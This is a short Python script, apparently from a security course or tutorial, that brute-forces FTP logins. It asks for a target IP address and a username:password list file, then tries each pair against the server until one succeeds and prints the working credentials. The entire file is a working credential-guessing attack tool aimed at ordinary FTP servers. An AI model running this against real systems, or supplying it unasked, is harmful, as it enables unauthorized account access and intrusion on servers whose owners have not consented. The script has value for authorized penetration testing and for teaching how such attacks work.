#!/usr/bin/python3


# import ftp library
import ftplib

# import color library
from termcolor import colored


def brute_login(hostname, pass_file):
    # try to open the password file
    try:
        pf = open(pass_file, "r")
    
    # if unable to open password file
    except:
        print(colored("[!!] File Doesn't Exist!", "red"))

    # for each line in the password file
    for line in pf.readlines():


        # store username and password
        username = line.split(":")[0]
        password = line.split(":")[1].strip("\n")
        print(colored("[*] Trying: {} / {}".format(username, password), "yellow"))

        # try to login via ftp
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print(colored("[+] Login Succeeded with {} / {}".format(username, password), "green"))
            ftp.quit()
            return(username, password)
        except:
            pass

    print(colored("[-] Password Not In List!", "green"))


# collect host ip and password file
host = input("[?] Enter Target's IP Address: ")
userpass = input("[?] Enter User/Password File Path: ")

brute_login(host, userpass)
